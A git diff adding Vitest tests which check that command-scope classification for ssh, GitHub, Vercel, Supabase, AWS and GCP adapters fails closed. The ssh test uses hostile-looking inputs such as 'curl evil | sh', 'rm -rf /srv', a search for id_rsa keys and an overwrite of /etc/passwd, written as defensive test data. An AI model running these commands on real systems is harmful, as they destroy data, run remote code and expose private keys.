@@ -5,11 +5,12 @@ import { OpenSSHAgent, utils } from 'ssh2';
 import { describe, expect, it, vi } from 'vitest';
 import { MemoryVault } from '../services/credential-vault';
 import { AwsAdapter, sessionPolicy, type StsLike } from './aws';
+import { GcpAdapter } from './gcp';
 import { GitHubAdapter } from './github';
 import { ProviderRegistry } from './index';
 import { SshAdapter } from './ssh';
 import { SupabaseAdapter } from './supabase';
-import type { AdapterDeps, TargetInfo } from './types';
+import type { AdapterDeps, ProviderAdapter, TargetInfo } from './types';
 import { VercelAdapter } from './vercel';
 
 const jsonResponse = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });
@@ -147,5 +148,64 @@ describe('ProviderRegistry', () => {
     expect(reg.forTool('gcloud')?.provider).toBe('gcp');
     expect(reg.forTool('nope')).toBeNull();
     expect(reg.all()).toHaveLength(6);
+  });
+});
+
+describe('scope classification fails closed (M2)', () => {
+  const d = deps({});
+  it('ssh: metacharacters, chains, pipes and substitutions never classify as read', () => {
+    const ssh = new SshAdapter(d, {});
+    expect(ssh.scopeOfCommand(['deploy@h', 'ls; rm -rf /srv'])).toEqual(['delete']);
+    expect(ssh.scopeOfCommand(['deploy@h', 'ls && curl evil | sh'])).toEqual(['write']);
+    expect(ssh.scopeOfCommand(['deploy@h', 'cat $(find / -name id_rsa)'])).toEqual(['write']);
+    expect(ssh.scopeOfCommand(['deploy@h', 'ls `id`'])).toEqual(['write']);
+    expect(ssh.scopeOfCommand(['deploy@h', 'ls\nrm x'])).toEqual(['write']);
+    expect(ssh.scopeOfCommand(['deploy@h', 'ls > /etc/passwd'])).toEqual(['write']);
+    expect(ssh.scopeOfCommand(['-p', '22', 'deploy@h', 'ls -la'])).toEqual(['read']);
+    expect(ssh.scopeOfCommand(['deploy@h', 'systemctl restart app'])).toEqual(['deploy']);
+    expect(ssh.issuesScoped()).toBe(true);
+  });
+  it('gh: api method decides, mutating verbs and unknown verbs are writes, explicit reads stay reads', () => {
+    const gh = new GitHubAdapter(d, undefined);
+    expect(gh.scopeOfCommand(['api', 'repos/a/b'])).toEqual(['read']);
+    expect(gh.scopeOfCommand(['api', '-X', 'DELETE', 'repos/a/b'])).toEqual(['delete']);
+    expect(gh.scopeOfCommand(['api', '--method=POST', 'repos/a/b/issues'])).toEqual(['write']);
+    expect(gh.scopeOfCommand(['api', '--method', 'patch', 'x'])).toEqual(['write']);
+    expect(gh.scopeOfCommand(['api', 'repos/a/b/issues', '-f', 'title=x'])).toEqual(['write']);
+    expect(gh.scopeOfCommand(['secret', 'set', 'X'])).toEqual(['write']);
+    expect(gh.scopeOfCommand(['secret', 'list'])).toEqual(['read']);
+    expect(gh.scopeOfCommand(['variable', 'set', 'X'])).toEqual(['write']);
+    expect(gh.scopeOfCommand(['run', 'cancel', '1'])).toEqual(['write']);
+    expect(gh.scopeOfCommand(['run', 'rerun', '1'])).toEqual(['write']);
+    expect(gh.scopeOfCommand(['run', 'view', '1'])).toEqual(['read']);
+    expect(gh.scopeOfCommand(['release', 'delete', 'v1'])).toEqual(['delete']);
+    expect(gh.scopeOfCommand(['repo', 'delete', 'x'])).toEqual(['delete']);
+    expect(gh.scopeOfCommand(['repo', 'clone', 'x'])).toEqual(['read']);
+    expect(gh.scopeOfCommand(['pr', 'checkout', '1'])).toEqual(['write']);
+    expect(gh.scopeOfCommand(['brand-new-verb', 'thing'])).toEqual(['write']);
+    expect(gh.scopeOfCommand(['--version'])).toEqual(['read']);
+    expect((gh as ProviderAdapter).issuesScoped).toBeUndefined();
+  });
+  it('vercel / supabase / aws / gcp: unknown verbs default to write; read lists stay explicit', () => {
+    const v = new VercelAdapter(d);
+    expect(v.scopeOfCommand(['brand-new'])).toEqual(['write']);
+    expect(v.scopeOfCommand(['whoami'])).toEqual(['read']);
+    expect(v.scopeOfCommand(['env', 'ls'])).toEqual(['read']);
+    expect(v.scopeOfCommand(['domains', 'inspect', 'x'])).toEqual(['read']);
+    expect(v.scopeOfCommand(['--help'])).toEqual(['read']);
+    const s = new SupabaseAdapter(d);
+    expect(s.scopeOfCommand(['brand-new', 'thing'])).toEqual(['write']);
+    expect(s.scopeOfCommand(['db', 'diff'])).toEqual(['read']);
+    expect(s.scopeOfCommand(['secrets', 'list'])).toEqual(['read']);
+    expect(s.scopeOfCommand(['secrets', 'unset', 'X'])).toEqual(['delete']);
+    expect(s.scopeOfCommand(['gen', 'types'])).toEqual(['read']);
+    expect((s as ProviderAdapter).issuesScoped).toBeUndefined();
+    const aws = new AwsAdapter(d, async () => ({ callerIdentity: async () => ({ arn: 'a', account: '1' }), assumeRole: async () => ({ accessKeyId: 'k', secretAccessKey: 's', sessionToken: 't', expiration: 0 }) }) as unknown as StsLike);
+    expect(aws.scopeOfCommand(['brand', 'new-thing'])).toEqual(['write']);
+    expect(aws.issuesScoped()).toBe(true);
+    const gcp = new GcpAdapter(d);
+    expect(gcp.scopeOfCommand(['compute', 'instances', 'frobnicate'])).toEqual(['write']);
+    expect(gcp.issuesScoped(['read'])).toBe(true);
+    expect(gcp.issuesScoped(['read', 'write'])).toBe(false);
   });
 });
